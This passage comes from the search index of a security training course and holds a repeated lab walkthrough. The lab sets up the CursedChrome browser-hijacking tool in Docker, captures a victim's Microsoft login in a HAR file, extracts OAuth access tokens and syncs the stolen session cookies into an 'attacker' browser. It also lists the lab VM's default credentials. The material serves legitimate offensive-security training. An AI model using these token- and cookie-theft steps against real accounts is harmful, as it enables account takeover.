\u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551 cursedchrome-cursedchrome-1 | \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551 cursedchrome-cursedchrome-1 | \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d cursedchrome-cursedchrome-1 | cursedchrome-cursedchrome-1 | ============================================================================ cursedchrome-cursedchrome-1 | cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] Starting the WebSocket server... cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] Starting the HTTP proxy server... cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] CursedChrome HTTP Proxy server is now running on port 8080. cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] Starting API server... cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] Worker 26 started cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] Starting the WebSocket server... cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] Starting the HTTP proxy server... cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] CursedChrome HTTP Proxy server is now running on port 8080. cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] Starting API server... cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] Worker 20 started cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] CursedChrome API server is now listening on port 8118 cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] CursedChrome API server is now listening on port 8118 cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:41 pm] A new browser has connected to us via WebSocket! cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:41 pm] Authenticating newly-connected browser... cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:41 pm] Browser ID b0552a0c-66d0-4c65-8437-df9b22769071 is not already registered. Creating new credentials for it... ``` In our example the username and password be: USERNAME: admin PASSWORD: 1067ac9tmctk3hrn0uu579gfnzcv3ofx Yours will be different. Next we will run two browsers. Chrome itself is found on the desktop of the system, this will be the VICTIM browser. The second would be Chromium. Chromium will be our ATTACKER browser. Command lines cd /opt/chromium-latest-linux ./run.sh On the Chromium Browser attempt to login to https://myapps.microsoft.com . You should notice the Microsoft Login Screen: Now let's login to Microsoft on the CHROME browser while SIMULTANOUSLY generating a HAR file. Login with the beth account using the username and password combination for the previous lab. Go to the following URL: https://myapps.microsoft.com Danger Do not log in yet. Click the 3 dots at the top left corner and choose More | Tools | Developer Tools. This can also be found by pressing ++CTRL+SHIFT+I++. Now proceed to login! Log in with the following URL: http://localhost:8118 , this is CursedChrome. Now that you have logged in switch back to the chromium browser. In the chromium browser you will have now a bot. Now that this is done let's download the appropriate extraction utility. This tool is called har-extractor. Command lines sudo npm install -g har-extractor Command lines cd ~/Downloads Command lines har-extractor ./myapps.microsoft.com.har --output har The access_token can be readily found here: Command lines /home/sec588/Downloads/har/login.microsoftonline.com/*/oauth2/v2.0/token | jq '.' The * in the path will match all of the tenants extracted in the har files. Moving back to CursedChrome, in the \"Chromium Browser\". You can also Synchronize Cookies. Click the top corner extension in CursedChrome Enter the Bot Username and Password Synchronize Cookies!","title":"Identities Lab 3"},{"location":"labs/identities/03-identities/#attacking-user-identities-passwords","text":"","title":"Attacking User Identities - Passwords!"},{"location":"labs/identities/03-identities/#brief-intro","text":"Welcome to our User Identities WorkShop Section 2, PASSWORDS!","title":"Brief Intro"},{"location":"labs/identities/03-identities/#requirements-for-this-lab","text":"","title":"Requirements for This Lab"},{"location":"labs/identities/03-identities/#walkthrough","text":"On your SEC588 VM we are now going to setup our environment to run CursedChrome first. The first thing we will do is remove old docker images for CursedChrome. Please open a MATE Teriminal for this. Command lines docker image rm 3b8fa45ab626 docker image rm 2167863c43fd docker image rm d6420819df1b Now that this is complete we will use \"CursedChrome\" locally Command lines cd /opt/CursedChrome docker-compose up -d You need to get the Admin Username and Password from CursedChrome once it is running: Command lines docker-compose logs cursedchrome !!! abstract \"Expected Results ```console hl_lines=\"21-22\" sec588@slingshot:/opt/CursedChrome$ docker-compose logs cursedchrome cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:32 pm] Master 8 is running cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:32 pm] Initializing the database connection... cursedchrome-cursedchrome-1 | No session secret set, generating one now... cursedchrome-cursedchrome-1 | Session secret generated successfully! cursedchrome-cursedchrome-1 | cursedchrome-cursedchrome-1 | ============================================================================ cursedchrome-cursedchrome-1 | cursedchrome-cursedchrome-1 | \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557 \u2588\u2588\u2557 cursedchrome-cursedchrome-1 | \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551 cursedchrome-cursedchrome-1 | \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551 cursedchrome-cursedchrome-1 | \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2554\u2550\u2550\u255d \u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551 cursedchrome-cursedchrome-1 | \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551 cursedchrome-cursedchrome-1 | \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d cursedchrome-cursedchrome-1 | cursedchrome-cursedchrome-1 | vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv cursedchrome-cursedchrome-1 | cursedchrome-cursedchrome-1 | An admin user (for the admin control panel) has been created cursedchrome-cursedchrome-1 | with the following credentials: cursedchrome-cursedchrome-1 | cursedchrome-cursedchrome-1 | USERNAME: admin cursedchrome-cursedchrome-1 | PASSWORD: 1067ac9tmctk3hrn0uu579gfnzcv3ofx cursedchrome-cursedchrome-1 | cursedchrome-cursedchrome-1 | Upon logging in to the admin control panel with these cursedchrome-cursedchrome-1 | credentials you will be prompted to change your password. cursedchrome-cursedchrome-1 | Please do so at your earliest convenience as this message cursedchrome-cursedchrome-1 | is potentially being logged by Docker. cursedchrome-cursedchrome-1 | cursedchrome-cursedchrome-1 | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ cursedchrome-cursedchrome-1 | cursedchrome-cursedchrome-1 | \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557 \u2588\u2588\u2557 cursedchrome-cursedchrome-1 | \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551 cursedchrome-cursedchrome-1 | \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551 cursedchrome-cursedchrome-1 | \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2554\u2550\u2550\u255d \u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551 cursedchrome-cursedchrome-1 | \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551 cursedchrome-cursedchrome-1 | \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d cursedchrome-cursedchrome-1 | cursedchrome-cursedchrome-1 | ============================================================================ cursedchrome-cursedchrome-1 | cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] Starting the WebSocket server... cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] Starting the HTTP proxy server... cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] CursedChrome HTTP Proxy server is now running on port 8080. cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] Starting API server... cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] Worker 26 started cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] Starting the WebSocket server... cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] Starting the HTTP proxy server... cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] CursedChrome HTTP Proxy server is now running on port 8080. cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] Starting API server... cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] Worker 20 started cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] CursedChrome API server is now listening on port 8118 cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:35 pm] CursedChrome API server is now listening on port 8118 cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:41 pm] A new browser has connected to us via WebSocket! cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:41 pm] Authenticating newly-connected browser... cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:41 pm] Browser ID b0552a0c-66d0-4c65-8437-df9b22769071 is not already registered. Creating new credentials for it... ``` In our example the username and password be: USERNAME: admin PASSWORD: 1067ac9tmctk3hrn0uu579gfnzcv3ofx Yours will be different. Next we will run two browsers. Chrome itself is found on the desktop of the system, this will be the VICTIM browser. The second would be Chromium. Chromium will be our ATTACKER browser. Command lines cd /opt/chromium-latest-linux ./run.sh On the Chromium Browser attempt to login to https://myapps.microsoft.com . You should notice the Microsoft Login Screen: Now let's login to Microsoft on the CHROME browser while SIMULTANOUSLY generating a HAR file. Login with the beth account using the username and password combination for the previous lab. Go to the following URL: https://myapps.microsoft.com Danger Do not log in yet. Click the 3 dots at the top left corner and choose More | Tools | Developer Tools. This can also be found by pressing ++CTRL+SHIFT+I++. Now proceed to login! Log in with the following URL: http://localhost:8118 , this is CursedChrome. Now that you have logged in switch back to the chromium browser. In the chromium browser you will have now a bot. Now that this is done let's download the appropriate extraction utility. This tool is called har-extractor. Command lines sudo npm install -g har-extractor Command lines cd ~/Downloads Command lines har-extractor ./myapps.microsoft.com.har --output har The access_token can be readily found here: Command lines /home/sec588/Downloads/har/login.microsoftonline.com/*/oauth2/v2.0/token | jq '.' The * in the path will match all of the tenants extracted in the har files. Moving back to CursedChrome, in the \"Chromium Browser\". You can also Synchronize Cookies. Click the top corner extension in CursedChrome Enter the Bot Username and Password Synchronize Cookies!","title":"Walkthrough"},{"location":"resources/virtual-machine-credentials/","text":"Virtual Machine Credentials The login credentials for all virtual machines used in this class are listed below for quick reference. All login credentials are also displayed in the respective virtual machine information panel. Below are screenshots showing the login credentials under VMware Workstation and VMware Fusion, respectively. Slingshot SEC588 Virtual Machine Username: sec588 Password: slingshot These credentials will be able to run sudo with no password requirement. SSH is not enabled on the device, if you do enable SSH it is HIGHLY recommended to change your password.","title":"Virtual Machine Credentials"},{"location":"resources/virtual-machine-credentials/#virtual-machine-credentials","text":"The login credentials for all virtual machines used in this class are listed below for quick reference. All login credentials are also displayed in the respective virtual machine information panel. Below are screenshots showing the login credentials under VMware Workstation and VMware Fusion, respectively. Slingshot SEC588 Virtual Machine Username: sec588 Password: slingshot These credentials will be able to run sudo with no password requirement. SSH is not enabled on the device, if you do enable SSH it is HIGHLY recommended to change your password.","title":"Virtual Machine Credentials"}]}